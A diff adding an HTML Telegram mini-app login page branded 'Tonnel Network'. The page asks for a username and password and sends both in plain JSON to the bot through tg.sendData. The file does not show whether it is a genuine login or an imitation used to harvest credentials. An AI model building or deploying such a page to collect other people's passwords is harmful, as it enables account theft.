@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <title>Tonnel Login</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #17181C;
+            color: #FFFFFF;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        .container {
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 30px;
+            color: #7B68EE;
+        }
+        .input-group {
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid rgba(123, 104, 238, 0.3);
+            background: rgba(123, 104, 238, 0.1);
+            color: #FFFFFF;
+            font-size: 16px;
+        }
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        button {
+            width: 100%;
+            max-width: 300px;
+            padding: 12px;
+            border-radius: 10px;
+            border: none;
+            background: #7B68EE;
+            color: #FFFFFF;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #6A5ACD;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.imgur.com/JK2UALS.png" alt="Logo" class="logo">
+        <h1>Tonnel Network</h1>
+        <div class="input-group">
+            <input type="text" placeholder="Username" id="username">
+        </div>
+        <div class="input-group">
+            <input type="password" placeholder="Password" id="password">
+        </div>
+        <button onclick="login()">Login</button>
+    </div>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+        
+        tg.setHeaderColor('#17181C');
+        tg.setBackgroundColor('#17181C');
+        
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                tg.MainButton.text = "Продолжить";
+                tg.MainButton.color = "#7B68EE";
+                tg.MainButton.textColor = "#FFFFFF";
+                tg.MainButton.show();
+                
+                tg.MainButton.onClick(() => {
+                    tg.sendData(JSON.stringify({
+                        action: 'login',
+                        username: username,
+                        password: password
+                    }));
+                });
+            }
+        }
+    </script>
+</body>
+</html> 
